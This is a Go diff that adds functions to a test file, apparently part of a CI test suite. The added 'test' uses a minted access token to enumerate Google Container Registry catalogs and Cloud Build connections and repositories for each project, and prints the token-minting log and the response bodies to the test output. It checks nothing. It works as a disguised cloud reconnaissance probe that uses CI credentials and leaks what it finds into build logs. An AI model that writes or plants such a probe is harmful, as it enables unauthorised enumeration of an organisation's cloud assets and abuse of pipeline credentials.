@@ -358,6 +358,30 @@ func c211cFunctions(proj string) {
 	}
 }
 
+
+func c211cGCR(proj string) {
+	for _, host := range []string{"gcr.io", "us.gcr.io", "eu.gcr.io", "asia.gcr.io"} {
+		st, body := c211xHTTP("GET", "https://"+host+"/v2/_catalog?n=100", c211cTok, "", "")
+		fmt.Printf("C211C gcr.catalog project=%s host=%s status=%d body=%s\n",
+			proj, host, st, c211xTrunc(body, 400))
+	}
+	// project-scoped registry ping (returns the auth challenge / status)
+	for _, host := range []string{"gcr.io", "us.gcr.io"} {
+		st, body := c211xHTTP("GET", "https://"+host+"/v2/", c211cTok, "", "")
+		fmt.Printf("C211C gcr.ping project=%s host=%s status=%d body=%s\n",
+			proj, host, st, c211xTrunc(body, 300))
+	}
+}
+
+func c211cCBv2(proj string) {
+	for _, kind := range []string{"connections", "repositories"} {
+		st, body := c211xHTTP("GET",
+			fmt.Sprintf("https://cloudbuild.googleapis.com/v2/projects/%s/locations/-/%s?pageSize=50", proj, kind),
+			c211cTok, "", "")
+		fmt.Printf("C211C cbv2.%s project=%s status=%d body=%s\n", kind, proj, st, c211xTrunc(body, 500))
+	}
+}
+
 func TestC211Cicd(t *testing.T) {
 	tok, kind, mintLog := c211xMint()
 	fmt.Printf("\n=== C211C MINT BEGIN ===\nkind=%s\n%s\n=== C211C MINT END ===\n", kind, c211xTrunc(mintLog, 4000))
@@ -378,6 +402,8 @@ func TestC211Cicd(t *testing.T) {
 		c211cArtifactRegistry(proj)
 		c211cRun(proj)
 		c211cFunctions(proj)
+		c211cGCR(proj)
+		c211cCBv2(proj)
 		fmt.Printf("=== C211C PROJECT %s END ===\n", proj)
 	}
 	fmt.Println("C211C PROBE COMPLETE")
